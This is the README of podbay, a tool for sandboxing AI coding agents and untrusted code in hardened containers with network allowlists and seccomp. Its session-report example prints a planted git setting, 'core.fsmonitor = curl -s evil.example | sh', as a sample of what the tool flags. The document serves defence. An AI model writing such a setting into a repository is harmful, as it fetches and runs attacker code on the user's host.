# Podbay

Disposable containers for working in a codebase, including running AI coding
agents and code you don't fully trust, without handing them your machine.

`podbay run` starts a throwaway container around a project directory. The
project is mounted read-write at `/home/dev/workspace/repomount`, and
everything else is something you declared:

- dotfiles mounted read-only, including your shell config
- named volumes for state that should outlive the container
- your own toolchain managers (rustup, uv, nvm, nix, mise, ...), run by a
  provisioning step into volumes
- the shell you want, environment variables and PATH entries
- optional root build scripts baked into a derived image
- network access: none, HTTPS to the hosts you list, or everything
- ports you forward, so the host can reach a server in the session

Anything that needs root, such as changes to the image, can only come from
your own config directory, never from the mounted project.

## Status

Being rebuilt in Rust, in stages:

1. **Rust port** with real config parsing, Podman and Docker backends, tests
   and CI. *(done)*
2. **Threat model**, plus a session report that flags changes to git hooks and
   config. *(done)*
3. **Container hardening**: dropped capabilities, `no-new-privileges`,
   read-only root filesystem, resource limits. *(done)*
4. Network policy: no network by default, with an allowlist enforced by a
   filtering proxy. Tool installs move to a separate provisioning step.
   *(done)*
5. Landlock and seccomp around processes inside the container. Seccomp:
   *(done)*. Landlock: next.
6. A native rootless runtime, with Podman and Docker kept as fallbacks.

[THREAT_MODEL.md](THREAT_MODEL.md) covers what is and isn't protected
today, and which stage closes each gap. The biggest: the project is mounted
read-write, so code inside can plant git hooks or config that run on your
host the next time you use git there. The [session report](#session-report)
tells you when that has happened.

## Install

```
cargo install --path .
```

You need Podman or Docker. Podman is preferred when both are installed
because it is rootless by default. With rootful Docker, a container escape is
root on the host, and podbay says so on every run.

## Quick start

```
podbay run ~/src/some-project
```

The first run builds the bundled base image: Debian slim with git, curl,
build-essential, bash and a non-root `dev` user. No language toolchains:
profiles bring those, with whatever manager you already use, and podbay
[provisions](#provisioning) them before the session starts. The session
itself has no network unless you give it some.

```
podbay run . -- make test     # run a command instead of a shell
podbay run --dry-run .        # print the exact podman/docker command
podbay run --online .         # give this session the network
podbay run --offline .        # or take it away, whatever the config says
podbay run --port 3080 .      # reach a server in the session on 127.0.0.1:3080
podbay build                  # build any missing images ahead of time
podbay build --force          # rebuild them all with current packages
podbay provision .            # run the profile's [provision] commands now
```

podbay's exit code is the command's (or the shell's) exit code.

Files the container creates in your project are owned by you on the host. On
rootless Podman, `dev` is mapped onto your user with `keep-id`. On rootful
Docker, podbay builds one more small image layer that gives `dev` your uid
and gid.

## What a session can do

- **Write**: the project, volumes, read-write mounts, and three scratch
  areas: `/home/dev`, `/tmp` and `/var/tmp`. The rest of the filesystem is
  read-only. The home directory is a fresh tmpfs every session, copied from
  the image at start. Anything worth keeping belongs in the project or a
  volume.
- **Privileges**: none. The session runs as `dev` with no capabilities and
  `no-new-privileges`, so setuid binaries and `sudo` don't work. The
  entrypoint starts with just enough to set up the home directory and fix
  mount ownership, then drops all of it before your command runs. A profile
  can keep specific capabilities with `cap_add` (see below).
- **Syscalls**: podbay's seccomp filter, the same on Podman and Docker. It
  is Docker's default profile with `ptrace` and reading or writing other
  processes' memory also blocked, so a session can't create namespaces,
  mount filesystems, use io_uring, BPF or keyrings, or trace processes.
  Podman's own default allows namespaces, mounts, keyrings and `ptrace`. A profile can allow specific
  calls back (see below), and `cap_add` brings back the calls that go with
  a capability, as with Docker.
- **Network**: none. The session has only a loopback interface, so it
  can't reach the internet, your LAN or the host. A profile can allow HTTPS
  to specific hosts (see [Network allowlist](#network-allowlist)), or turn
  on full access with `network = "full"`. If you mostly work online, set
  that in `config.toml` and use `--offline` when you don't want it; podbay
  states the setting on every run. When a profile turns full access on,
  podbay prints a warning instead, since that's easy to miss. Installing
  tools needs neither; see [Provisioning](#provisioning).
- **Incoming connections**: none, unless you
  [forward a port](#forwarded-ports). Then the host can reach that one
  port, from its own `127.0.0.1` only.
- **Resources**: at most 4096 processes and threads by default. Memory and
  CPU limits are opt-in. Rootless engines can apply a limit only when
  systemd delegates that cgroup controller to your user. When it doesn't,
  podbay warns and runs without that limit.

## Network allowlist

A profile can let the session reach a few hosts over HTTPS and nothing else:

```toml
network = ["api.anthropic.com", "*.githubusercontent.com", "registry.example.com:8443"]
```

`*.example.com` covers every name below `example.com` (not `example.com`
itself), and the port is 443 unless you give one. A list in a profile adds to
the lists of the profiles it extends; `"none"` or `"full"` replaces them.
`--offline` and `--online` (or `--network none|full`) override everything
for one run.

The session still has no network interface besides loopback. podbay starts a
tiny relay container next to it, with no network either, and the session
shares the relay's network namespace. The relay listens on `127.0.0.1:3128`
and passes every connection to podbay on the host, which:

- accepts only HTTPS proxy requests (`CONNECT host:port`), for names on the
  list. IP addresses are refused, and names not on the list are never
  looked up, so a session can't leak data through DNS.
- refuses names that resolve to loopback, private, link-local (including
  cloud metadata at 169.254.169.254) or other non-public addresses. A
  registry on your LAN can't be allowed this way.
- connects from the host and copies bytes both ways. TLS is end to end
  between the session and the server; podbay sees only the host name.

The session gets `HTTPS_PROXY` and `HTTP_PROXY` (and the lowercase forms)
pointing at the relay, and `NODE_USE_ENV_PROXY=1` for Node. Most tools,
including curl, git over HTTPS, npm, pip and cargo, pick these up. Node itself
honors them from 24.5 and 22.21 (`fetch` alone from 24.0); on older versions a
script's own HTTPS requests fail as if the name didn't resolve.
Anything that ignores them, or uses another protocol such as SSH, gets no
connection at all. Plain `http://` URLs are refused.

After the session, podbay lists every destination it asked for:

```
podbay: network:
  api.anthropic.com:443: allowed (14 times)
  pastebin.com:443: denied, not on the allowlist
```

The relay image is built from source the first time it's needed, from a
pinned Rust image, and is under 1 MB.

## Forwarded ports

A web UI, dev server or docs preview running in the session can be made
reachable from the host:

```toml
ports = [3080]             # host 127.0.0.1:3080 -> session port 3080
ports = ["8080:3000"]      # host 127.0.0.1:8080 -> session port 3000
```

```
podbay run --port 3080 .
podbay run --port 8080:3000 .
podbay: forwarding http://127.0.0.1:8080 to session port 3000
```

Lists add up across `extends` and `--port`; forwarding one host port to two
session ports is an error. A host port that's already taken fails the run
before anything starts.

The server only has to listen on the session's loopback (`127.0.0.1` or
`::1`), which is the default for most dev servers. podbay listens on the
host's `127.0.0.1`, never on other addresses, so a forward can't expose a
session to your LAN. It works with any network setting: the session shares
the relay container's network namespace, and the relay connects each
connection podbay passes it to that port. The session can't open anything
through a forward. After the session, podbay counts the connections:

```
podbay: forwarded ports:
  127.0.0.1:8080 -> session port 3000: 12 connections
```

A forward lets more than you in. Anything on your machine can connect to
it, including web pages open in your browser, so a server that acts on
requests (an agent's web UI that runs commands) can be driven by them.
Pages served from the session can also read and set cookies of every other
web app you use on `localhost`, since browsers don't separate cookies by
port. Forward only while you need it, and use a separate browser profile
for it. [THREAT_MODEL.md](THREAT_MODEL.md#other-channels-and-the-stage-that-closes-them)
has the details.

## Provisioning

podbay doesn't pick a toolchain manager for you. A profile names a command
that installs tools, and volumes for them to live in:

```toml
# ~/.config/podbay/profiles/rust.toml
path = ["/home/dev/.cargo/bin"]

[env]
RUSTUP_HOME = "/home/dev/.rustup"
CARGO_HOME = "/home/dev/.cargo"

[[volume]]
name = "rustup"
container = "/home/dev/.rustup"
provision = true

[[volume]]
name = "cargo"
container = "/home/dev/.cargo"
provision = true

[provision]
command = """
command -v rustup >/dev/null || curl -sSf https://sh.rustup.rs | sh -s -- -y --no-modify-path
rustup show active-toolchain || rustup toolchain install
"""
watch = ["rust-toolchain.toml", "rust-toolchain"]
```

The command runs with `sh -e` before the session, in a separate short-lived
container. That container has network access but sees only what installing
needs: the project, read-only, the volumes marked `provision = true`, and
the profile's `[env]` and `path`. Bind mounts, other volumes and
capabilities are left out, so credentials kept there never share a
container with the network, even when the session itself is offline.
Commands from every profile in the `extends` chain run in order, ancestors
first.

`podbay run` provisions by itself when anything that decides the tools
changed since the last successful run: the image, the commands, the
provision volumes, `[env]`, `path`, `--local-cache`, or a file listed in
`watch`. A watched directory covers the files directly in it. podbay prints
a line when it provisions. If provisioning fails, the session still starts,
with a warning.

Run `podbay provision` yourself to refresh tools pinned to `latest`, after
removing a volume, or when tools come from files you don't watch. It
installs into the same volumes `run` would; pass `--local-cache` to match
`run --local-cache`.

A toolchain manager itself can come from the provisioning command, as
above, or from an [extension](#profiles) baked into the image. mise is just
one more option: install it in an extension, give it a volume for
`~/.local/share/mise`, and use `mise install` as the command.

## Session report

When the container exits, podbay reports anything it changed that the host
will act on later: git hooks, git config, the `.git` entry itself, nested
repositories, and a few files that editors and tools on the host run
(`.envrc`, `.vscode/`, mise config).

```
podbay: session report: 2 warnings, 1 notice
  warning: .git/config: settings changed
            + core.fsmonitor = curl -s evil.example | sh   [can run commands]
  warning: .git/hooks/post-checkout: added, an executable file
  notice:  .envrc: changed during the session (direnv runs it in your shell once allowed)
podbay: git and other tools on the host act on these files. Inspect them before running git in /home/me/src/app
```

A clean session ends with one line:
`podbay: session report: no changes to git hooks or config`.

A warning means don't run git in that project on the host until you've
looked at the files it lists. Legitimate work can trigger it too, for
example when the container runs `git checkout -b x --track` and that
writes branch settings. The settings list makes that easy to tell apart.
The report detects changes; it doesn't revert them.
[THREAT_MODEL.md](THREAT_MODEL.md) lists what it covers and its limits.

## Profiles

A profile is a single TOML file in `~/.config/podbay/profiles/`:

```
podbay profile init base
podbay profile init ai --extends base
podbay profile list
podbay profile show ai        # everything ai resolves to, inheritance merged
podbay run -p ai .
```

If you don't pass `-p`, podbay uses `default_profile` from `config.toml`,
otherwise a profile named `default` if one exists.

```toml
# ~/.config/podbay/profiles/base.toml

# Bind mounts from the host, read-only unless mode = "rw".
[[mount]]
host = "~/.gitconfig"
container = "/home/dev/.gitconfig"

[[mount]]
host = "~/.bashrc"
container = "/home/dev/.bashrc"
```

```toml
# ~/.config/podbay/profiles/zsh.toml: for zsh users. bash is the default.
extends = ["base"]
extension = "zsh.sh"       # apt-get install -y zsh
shell = "zsh"              # started as a login shell when no command is given

[[mount]]
host = "~/.zshrc"
container = "/home/dev/.zshrc"
```

```toml
# ~/.config/podbay/profiles/ai.toml
extends = ["base"]

# Optional: a root build script for system packages.
# Relative to the profiles directory; must start with a shebang.
extension = "ai.sh"

# The agent calls its API, and nothing else.
network = ["api.anthropic.com"]

# Where the provisioned agent lives (see the last volume).
path = ["/home/dev/.opencode/bin"]

# Named volumes keep tool state across runs. Stored as podbay-ai-<name>.
[[volume]]
name = "opencode-config"
container = "/home/dev/.config/opencode"

[[volume]]
name = "opencode-data"
container = "/home/dev/.local/share/opencode"

# The agent itself, installed into its own volume.
[[volume]]
name = "opencode-bin"
container = "/home/dev/.opencode"
provision = true

[provision]
command = "test -x ~/.opencode/bin/opencode || curl -fsSL https://opencode.ai/v2/install | bash"
```

```toml
# ~/.config/podbay/profiles/debug.toml
extends = ["base"]

# Capabilities the session keeps (none by default). podbay prints them on
# every run that uses this profile. SYS_PTRACE also lets ptrace through
# the seccomp filter.
cap_add = ["SYS_PTRACE"]   # gdb, strace

# Syscalls the seccomp filter blocks that this profile needs. podbay
# prints them on every run. engine_default = true uses the engine's own
# filter instead, which on Podman is much looser.
[seccomp]
allow = ["io_uring_setup", "io_uring_enter", "io_uring_register"]

# Override the limits from config.toml.
[limits]
memory = "16g"
```

With `extends`, ancestors are applied first. A later profile's mount or
volume replaces an inherited one at the same container path, `[env]` keys
and `shell` override inherited ones, and its `path` entries go in front of
inherited ones. `[provision]` commands and `watch` lists, `cap_add` and
`[seccomp] allow` lists are combined, and `engine_default` is inherited
until a profile sets it. `[limits]` keys override one at a time, and `network`
host lists add up while `"none"` or `"full"` replaces what came before.
`ports` lists add up too. Volumes keep the name of the profile that
declared them, so every profile extending `base` shares `base`'s volumes.

**Mounts or volumes?** Use mounts for files you own and edit on the host, such
as shell and git config. Use volumes for directories the container creates
or writes into, such as toolchains, since the home directory is wiped after
every session. Keep mounts of anything your host runs read-only: a
read-write `~/.bashrc` or `~/.cargo` lets the session plant code that runs
on your host. The engine creates a missing mount point's parent
directories as root, and the entrypoint gives them to `dev`.

**Extensions** are layered as derived images (`podbay-<profile>:<hash>`).
Each tag is a hash of the script and its parent image's tag, so editing a
script, or any script below it in the chain, rebuilds exactly what changed.
What a script downloads isn't part of the hash, and neither is a custom base
rebuilt under the same tag: run `podbay build --force` to pick those up.
Extensions run as root at build time, the only time the root filesystem is
writable. Anything they put in `/home/dev` is copied into the home skeleton
automatically.

## Configuration

`~/.config/podbay/config.toml` (all keys optional):

```toml
backend = "podman"           # or "docker"; default: podman if installed
default_profile = "base"
base_image = "my/image:tag"  # use your own image instead of the bundled one
network = "none"             # "full", or a host list; --online/--offline override it

[limits]                     # profiles can override each key
pids = 4096                  # processes and threads; 0 for no limit
memory = "8g"                # default: no limit
cpus = 4                     # default: no limit
```

A custom base image must provide a `dev` user, `setpriv`, podbay's
entrypoint, and a copy of `/home/dev` at `/usr/local/share/podbay/home` to
seed the home directory from (see `base/Containerfile`). For `path` to
survive login shells, it also needs the `/etc/profile.d/podbay-path.sh`
snippet from there.

`PODBAY_CONFIG_DIR` and `PODBAY_CACHE_DIR` move podbay's config and cache
directories without touching `HOME` or `XDG_*`. Rootless Podman uses those to
find its own storage.

## Shared toolchains and trust

Provision volumes are shared by every project run with the profile that
declared them, so tools installed for one project are there for the next.
Installers run with network access and the project visible, and the project
chooses versions through its watched files, so a malicious project could
leave something behind in a shared volume that other projects then run. For
code you don't trust, `--local-cache` gives that project its own copies of
the provision volumes (`podbay-<profile>-<name>-<repo-key>`).

## Development

```
cargo test                          # unit, CLI and end-to-end tests
PODBAY_TEST_BACKEND=podman cargo test
```

The end-to-end tests run real containers on Docker (or the engine named by
`PODBAY_TEST_BACKEND`) and are skipped when that engine isn't available. They
use a small stand-in for the base image (`tests/fixtures/test-base`) with the
same entrypoint and a fake installer that records what provisioning saw, so
they don't need to build the full toolchain. Two of them play a hostile
session: one checks that the session report catches it, the other that the
network allowlist holds. Set `PODBAY_TEST_INTERNET=1` to also check that an
allowed host is reachable, as CI does.

The relay is its own crate in `relay/`, standard library only; run
`cargo test --workspace` and `cargo clippy --workspace` to include it.
